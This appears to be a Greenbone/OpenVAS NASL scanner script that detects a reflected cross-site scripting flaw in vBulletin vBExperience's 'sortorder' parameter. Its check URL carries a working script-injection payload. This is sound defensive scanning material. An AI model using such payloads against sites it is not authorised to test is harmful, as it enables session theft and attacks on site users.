# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103171");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-06-06 13:42:32 +0200 (Mon, 06 Jun 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("vBulletin vBExperience 'sortorder' Parameter Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48106");
  script_xref(name:"URL", value:"http://www.vbulletin.org/forum/showthread.php?t=171014");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("vbulletin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vbulletin/detected");

  script_tag(name:"summary", value:"vBulletin vBExperience is prone to a cross-site scripting
  vulnerability because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and to launch other attacks.");

  script_tag(name:"affected", value:"vBulletin vBExperience 3.0 is vulnerable, other versions may also
  be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are
  to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = "cpe:/a:vbulletin:vbulletin";

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir,'/xperience.php?sortfield=xr&sortorder="><script>alert(/vt-xss-test/);</script>');
if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(/vt-xss-test/\);</script>", check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
